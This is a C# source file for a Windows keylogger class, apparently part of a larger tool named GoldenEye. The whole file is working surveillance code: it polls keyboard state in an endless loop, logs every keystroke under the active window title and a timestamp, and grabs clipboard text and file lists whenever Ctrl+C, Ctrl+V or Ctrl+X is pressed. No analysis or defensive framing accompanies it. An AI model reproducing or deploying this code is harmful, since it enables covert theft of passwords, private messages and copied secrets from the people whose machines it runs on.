using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace GoldenEye.Functions
{
    public class Keylogger
    {

        public static string KeyLog;
        public static string LastWindow;
        public static bool letRun = true;
        private static Dictionary<Keys, string> al = new Dictionary<Keys, string>();
        private static Dictionary<Keys, string> sf = new Dictionary<Keys, string>();
        private static Dictionary<Keys, string> ag = new Dictionary<Keys, string>();
        private static Dictionary<Keys, string> ct = new Dictionary<Keys, string>();
        private static bool setupCompleted = false;
        private static bool shiftHeld = false;
        private static bool altgrHeld = false;
        private static bool ctrlHeld = false;
        private static int ctrl_key = 0x11;
        private static int altgr_key = 0xA5;
        private static int shift_key = 0x10;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetClipboard()
        {
            string result = "";
            Thread STAThread = new Thread
                (
                    delegate ()
                    {
                        if (Clipboard.ContainsAudio()) result = "System.IO.Stream [Clipboard Data is Audio Stream]";
                        else if (Clipboard.ContainsImage()) result = "System.Drawing.Image [Clipboard data is Image]";
                        else if (Clipboard.ContainsFileDropList())
                        {
                            System.Collections.Specialized.StringCollection files = Clipboard.GetFileDropList();
                            result = "System.Collections.Specialized.StringCollection [Clipboard Data is File Drop List]\nFiles:\n";
                            foreach (string file in files)
                            {
                                result += file + "\n";
                            }
                        }
                        else if (Clipboard.ContainsText()) result = "System.String [Clipboard Data is Text]\nText:\n" + Clipboard.GetText();
                        else result = "Clipboard Data Not Retrived!\nPerhaps no data is selected when ctrl+c was pressed :(";
                        IDataObject obj = Clipboard.GetDataObject();
                        string text = obj.GetData(DataFormats.Text).ToString();
                        Console.WriteLine("Clipboard function done :)");

                        //Console.WriteLine("data clipboard: " + Clipboard.GetData("%s").ToString());
                    }
                );
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
            return result;
        }

        private static string updateRealTimeData(Keys currentKey, string inputValue)
        {
            string newData = "";

            if (currentKey == Keys.NumLock || currentKey == Keys.CapsLock || currentKey == Keys.Scroll)
            {
                Thread.Sleep(100);
                string state = (Control.IsKeyLocked(currentKey)) ? "Enabled" : "Disabled";
                newData = inputValue.Replace("<rtd.state>", state);
            }
            else if (currentKey == Keys.LButton || currentKey == Keys.RButton)
            {
                string posx = Cursor.Position.X.ToString();
                string posy = Cursor.Position.Y.ToString();
                newData = inputValue.Replace("<rtd.xpos>", posx);
                newData = newData.Replace("<rtd.ypos>", posy);
            }
            else if (currentKey == Keys.X || currentKey == Keys.V || currentKey == Keys.C)
            {
                Thread.Sleep(100);
                newData = inputValue.Replace("<rtd.clipboard>", GetClipboard());
            }
            else
            {
                return inputValue;
            }

            return newData;
        }

        private static void Setup()
        {
            //Shift, Alt Gr, Control, Default Modifiers may be different per locales/countries :(
            //al.Add is for keys without modifiers(ex. no shift or alt g or controlr is held while the keys was pressed)
            //sf.Add is for keys when the SHIFT modifier is held while the key was pressed
            //ag.Add is for keys when the ALT GR modifier is held while the key was pressed
            //ct.Add is for keys when the CTL modifiers is held qhile the key was pressed

            al.Add(Keys.Enter, "\n");
            al.Add(Keys.Space, " ");
            al.Add(Keys.NumPad0, "0");
            sf.Add(Keys.NumPad0, " [INSERT] ");
            al.Add(Keys.NumPad1, "1");
            sf.Add(Keys.NumPad1, " [END] ");
            al.Add(Keys.NumPad2, "2");
            sf.Add(Keys.NumPad2, " [ARROW, DOWN] ");
            al.Add(Keys.NumPad3, "3");
            sf.Add(Keys.NumPad3, " [PAGE, DOWN] ");
            al.Add(Keys.NumPad4, "4");
            sf.Add(Keys.NumPad4, " [ARROW, LEFT] ");
            al.Add(Keys.NumPad5, "5");
            al.Add(Keys.NumPad6, "6");
            sf.Add(Keys.NumPad6, " [ARROW, RIGHT] ");
            al.Add(Keys.NumPad7, "7");
            sf.Add(Keys.NumPad7, " [HOME] ");
            al.Add(Keys.NumPad8, "8");
            sf.Add(Keys.NumPad8, " [ARROW, UP] ");
            al.Add(Keys.NumPad9, "9");
            sf.Add(Keys.NumPad9, " [PAGE, UP] ");
            al.Add(Keys.Add, "+");
            al.Add(Keys.Back, " [BACKSPACE] ");
            al.Add(Keys.CapsLock, " [CapsLock, state: " + "<rtd.state>" + "] ");
            al.Add(Keys.D0, "0");
            sf.Add(Keys.D0, "§");
            al.Add(Keys.D1, "1");
            sf.Add(Keys.D1, "'");
            al.Add(Keys.D2, "2");
            sf.Add(Keys.D2, "\"");
            al.Add(Keys.D3, "3");
            sf.Add(Keys.D3, "+");
            al.Add(Keys.D4, "4");
            sf.Add(Keys.D4, "!");
            al.Add(Keys.D5, "5");
            sf.Add(Keys.D5, "%");
            al.Add(Keys.D6, "6");
            sf.Add(Keys.D6, "/");
            al.Add(Keys.D7, "7");
            sf.Add(Keys.D7, "=");
            al.Add(Keys.D8, "8");
            sf.Add(Keys.D8, "(");
            al.Add(Keys.D9, "9");
            sf.Add(Keys.D9, ")");
            al.Add(Keys.Delete, " [DEL] ");
            al.Add(Keys.Divide, "÷");
            al.Add(Keys.Down, " [ARROW, DOWN] ");
            al.Add(Keys.End, " [END] ");
            al.Add(Keys.Escape, " [ESC] ");
            al.Add(Keys.Home, " [HOME] ");
            al.Add(Keys.Insert, " [INSERT] ");
            al.Add(Keys.LButton, " *Left Click* ");
            al.Add(Keys.Left, " [ARROW, LEFT] ");
            al.Add(Keys.LWin, " [LEFT WINDOWS] ");
            al.Add(Keys.Multiply, "×");
            al.Add(Keys.Oemcomma, ",");
            sf.Add(Keys.Oemcomma, "?");
            ag.Add(Keys.Oemcomma, ";");
            al.Add(Keys.OemMinus, "-");
            sf.Add(Keys.OemMinus, "_");
            ag.Add(Keys.OemMinus, "*");
            al.Add(Keys.OemPeriod, ".");
            sf.Add(Keys.OemPeriod, ":");
            ag.Add(Keys.OemPeriod, ">");
            al.Add(Keys.PageDown, " [PAGE, DOWN] ");
            al.Add(Keys.PageUp, " [PAGE, UP] ");
            al.Add(Keys.PrintScreen, " [PRINT SCREEN] ");
            al.Add(Keys.RButton, " *Right Click* ");
            al.Add(Keys.Right, " [ARROW, RIGHT] ");
            al.Add(Keys.RWin, " [RIGHT WINDOWS] ");
            al.Add(Keys.Scroll, " [Scroll Lock, state: " + "<rtd.state>" + "] ");
            al.Add(Keys.Subtract, "-");
            al.Add(Keys.Tab, " [TAB] ");
            al.Add(Keys.Up, " [ARROW, UP] ");
            al.Add(Keys.NumLock, " [Num Lock, state: " + "<rtd.state>" + "] ");

            //ALT GR Keys different per country (more countries may supported by default in a newer version)
            ag.Add(Keys.S, "đ");
            ag.Add(Keys.F, "[");
            ag.Add(Keys.G, "]");
            ag.Add(Keys.K, "ł");
            ag.Add(Keys.L, "Ł");
            ag.Add(Keys.Y, ">");
            ag.Add(Keys.X, "#");
            ag.Add(Keys.C, "&");
            ag.Add(Keys.V, "@");
            ag.Add(Keys.B, "{");
            ag.Add(Keys.N, "}");
            ag.Add(Keys.Q, "\\");
            ag.Add(Keys.W, "|");
            ag.Add(Keys.U, "€");
            ag.Add(Keys.D1, "~");
            ag.Add(Keys.D2, "ˇ");
            ag.Add(Keys.D3, "^");
            ag.Add(Keys.D4, "˘");
            ag.Add(Keys.D5, "°");
            ag.Add(Keys.D6, "˛");
            ag.Add(Keys.D7, "`");
            ag.Add(Keys.D8, "˙");
            ag.Add(Keys.D9, "´");

            //CTRL Key Overrides (mostly good for any country)

            ct.Add(Keys.C, " [Control+C, clipboard: <rtd.clipboard>] ");
            ct.Add(Keys.V, " [Control+V, clipboard: <rtd.clipboard>] ");
            ct.Add(Keys.Z, " [Control+Z, Undo] ");
            ct.Add(Keys.F, " [Control+F, Search] ");
            ct.Add(Keys.X, " [Control+X, clipboard: <rtd.clipboard>] ");

            //Country Specific overrides (comment these if your keyboard is not like this)

            //Most likely you will NEED to overwirte this
            //if your keyboard is different than this!
            //More countries may be supported by default in a newer version

            al.Add(Keys.Oemtilde, "ö");
            sf.Add(Keys.Oemtilde, "Ö");
            ag.Add(Keys.Oemtilde, "˝");
            al.Add(Keys.OemQuestion, "ü");
            sf.Add(Keys.OemQuestion, "Ü");
            ag.Add(Keys.OemQuestion, "¨");
            al.Add(Keys.Oemplus, "ó");
            sf.Add(Keys.Oemplus, "Ó");
            al.Add(Keys.OemOpenBrackets, "ő");
            sf.Add(Keys.OemOpenBrackets, "Ő");
            ag.Add(Keys.OemOpenBrackets, "÷");
            al.Add(Keys.Oem6, "ú");
            sf.Add(Keys.Oem6, "Ú");
            ag.Add(Keys.Oem6, "×");
            al.Add(Keys.Oem1, "é");
            sf.Add(Keys.Oem1, "É");
            ag.Add(Keys.Oem1, "$");
            al.Add(Keys.OemQuotes, "á");
            sf.Add(Keys.OemQuotes, "Á");
            ag.Add(Keys.OemQuotes, "ß");
            al.Add(Keys.OemPipe, "ű");
            sf.Add(Keys.OemPipe, "Ű");
            ag.Add(Keys.OemPipe, "¤");
            al.Add(Keys.OemBackslash, "í");
            sf.Add(Keys.OemBackslash, "Í");
            ag.Add(Keys.OemBackslash, "<");

            setupCompleted = true;
        }

        public static void Logger()
        {
            if (!setupCompleted) Setup();
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                if (!letRun) continue;
                for (Int32 i = 0; i < 255; i++)
                {
                    //Console.WriteLine("testing keys");
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        shiftHeld = Convert.ToBoolean(GetAsyncKeyState(shift_key));
                        altgrHeld = Convert.ToBoolean(GetAsyncKeyState(altgr_key));
                        ctrlHeld = Convert.ToBoolean(GetAsyncKeyState(ctrl_key));
                        string append = "";
                        //Console.WriteLine(i);
                        if (al.ContainsKey((Keys)i))
                        {
                            append = al[(Keys)i];
                            append = updateRealTimeData((Keys)i, append);
                            if (sf.ContainsKey((Keys)i) && shiftHeld)
                            {
                                append = sf[(Keys)i];
                            }

                            if (ag.ContainsKey((Keys)i) && altgrHeld)
                            {
                                append = ag[(Keys)i];
                            }

                            if (ct.ContainsKey((Keys)i) && ctrlHeld && !altgrHeld)
                            {
                                append = ct[(Keys)i];
                                append = updateRealTimeData((Keys)i, append);
                            }
                        }
                        else
                        {
                            append = "";
                        }

                        if (LastWindow == GetActiveWindowTitle())
                        {
                            if (append != "")
                            {
                                KeyLog = KeyLog + append;
                            }
                            else
                            {
                                string currentKey = Convert.ToString((Keys)i);
                                //int code = GetAsyncKeyState(0x10); //32768 if pressed
                                //int altcode = GetAsyncKeyState(0xA5); //the right alt a.k.a the altgr key code
                                //Console.WriteLine("Alt Code: " + altcode);
                                if (!Control.IsKeyLocked(Keys.CapsLock) && !shiftHeld)
                                {
                                    currentKey = currentKey.ToLower();
                                }
                                else
                                {
                                    Console.WriteLine("Caps: " + (Control.IsKeyLocked(Keys.CapsLock)).ToString());
                                    //Console.WriteLine("Shift code: " + code.ToString());
                                    //if (!Control.IsKeyLocked(Keys.CapsLock)) shiftHeld = true;
                                }

                                if (currentKey.ToLower().Contains("shift") || currentKey.ToLower().Contains("menu") || currentKey.ToLower().Contains("control"))
                                {
                                }
                                else
                                {
                                    if (sf.ContainsKey((Keys)i) && shiftHeld)
                                    {
                                        currentKey = sf[(Keys)i];
                                    }

                                    if (ag.ContainsKey((Keys)i) && altgrHeld)
                                    {
                                        currentKey = ag[(Keys)i];
                                    }

                                    if (ct.ContainsKey((Keys)i) && ctrlHeld && !altgrHeld)
                                    {
                                        currentKey = ct[(Keys)i];
                                        currentKey = updateRealTimeData((Keys)i, currentKey);
                                    }
                                    KeyLog = KeyLog + currentKey;
                                }
                            }

                        }
                        else
                        {
                            bool appendMade = false;
                            if (append != "")
                            {
                                KeyLog = KeyLog + "\n[" + GetActiveWindowTitle() + "  Time: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + "]\n " + append;
                                appendMade = true;
                            }
                            else
                            {
                                string currentKey = Convert.ToString((Keys)i);
                                //int code = GetAsyncKeyState(0x10); //32768 if pressed
                                //int altcode = GetAsyncKeyState(0xA5); //the right alt a.k.a the altgr key code
                                if (!Control.IsKeyLocked(Keys.CapsLock) && !shiftHeld)
                                {
                                    currentKey = currentKey.ToLower();
                                }
                                else
                                {
                                    Console.WriteLine("Caps: " + (Control.IsKeyLocked(Keys.CapsLock)).ToString());
                                    //Console.WriteLine("Shift code: " + code.ToString());
                                    //shiftHeld = true;
                                }

                                if (currentKey.ToLower().Contains("shift") || currentKey.ToLower().Contains("menu") || currentKey.ToLower().Contains("control"))
                                {
                                }
                                else
                                {
                                    if (sf.ContainsKey((Keys)i) && shiftHeld)
                                    {
                                        append = sf[(Keys)i];
                                        Console.WriteLine("Shift override applied to text");
                                    }
                                    if (ag.ContainsKey((Keys)i) && altgrHeld)
                                    {
                                        currentKey = ag[(Keys)i];
                                        Console.WriteLine("Alt Gr override applied to text");
                                    }
                                    if (ct.ContainsKey((Keys)i) && ctrlHeld && !altgrHeld)
                                    {
                                        currentKey = ct[(Keys)i];
                                        currentKey = updateRealTimeData((Keys)i, currentKey);
                                        Console.WriteLine("Ctrl override applied to text /normal text/");
                                    }

                                    KeyLog = KeyLog + "\n[" + GetActiveWindowTitle() + "  Time: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + "]\n " + currentKey;
                                    /*shiftHeld = false;
                                    altgrHeld = false;*/
                                    appendMade = true;
                                }
                            }

                            if (appendMade) LastWindow = GetActiveWindowTitle();
                        }
                        //Console.Write((Keys)i);

                        break;
                    }
                }
            }
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

    }
}
